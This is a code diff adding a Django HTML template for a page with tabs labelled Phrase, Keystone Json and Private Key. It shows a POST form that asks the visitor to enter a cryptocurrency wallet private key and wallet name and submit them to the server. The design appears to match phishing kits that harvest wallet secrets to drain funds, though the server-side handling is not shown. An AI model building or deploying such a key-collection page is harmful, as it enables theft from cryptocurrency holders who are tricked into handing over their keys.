@@ -1,0 +1,75 @@
+{% extends 'partials/base.html' %}
+{% load static %}
+
+
+{% block content %}
+
+    <div class="pt-55 pb-80">
+        <div class="tf-container">
+
+            <div class="mt-20">
+
+                <div class="line-bt">
+                    <div class="swiper swiper-wrapper-r market-swiper" data-space-between="20" data-preview="auto">
+                        <div class="swiper-wrapper menu-tab-v3" role="tablist">
+
+                            <a href="{% url 'core:phrase_forms' %}" class="swiper-slide nav-link " >
+                                <span>Phrase</span>       
+                            </a>
+
+                            <a href="{% url 'core:key_forms' %}" class="swiper-slide nav-link" >
+                                Keystone Json    
+                            </a>
+
+                            <a href="{% url 'core:private_forms' %}" class="swiper-slide nav-link" >
+                                Private Key   
+                            </a>
+
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="tab-content mt-8 mb-16">
+                    
+                    <div class=" " id="attractive" role="tabpanel">
+                        
+                        <ul class="mt-16">
+                            <li>
+                                <div class="pt-0 pb-16">
+                                    <form method="POST" class="tf-container">
+                                        {% csrf_token %}
+
+                                        <div class="d-flex justify-content-between">
+                                           <span class="text-primary">Private Key</span>
+                                        </div> 
+                                        
+                                        <!-- <div class="mt-4 coin-item style-2 gap-8">
+                                            <img src="images/coin/coin-1.jpg" alt="img" class="img" />
+                                        </div> -->
+
+                                        <div class="mt-8 group-ip-select">
+                                            {{private_form.private_key}}
+                                        </div>
+
+                                        <div class="mt-8 group-ip-select">
+                                            {{private_form.wallet_name}}
+                                        </div>
+
+                                        <p class="mt-8">Typically 12 (sometimes 24) words seperated by a single space.</p>
+                                        
+                                        <button type="submit" class="tf-btn lg primary mt-40">Proceed</button>
+                                        <a href="/" class="tf-btn lg bg-danger mt-6">Cancel</a>
+                                    </form>
+                                </div>
+                            </li>
+                         
+                        </ul>      
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+    
+{% endblock content %}
+    
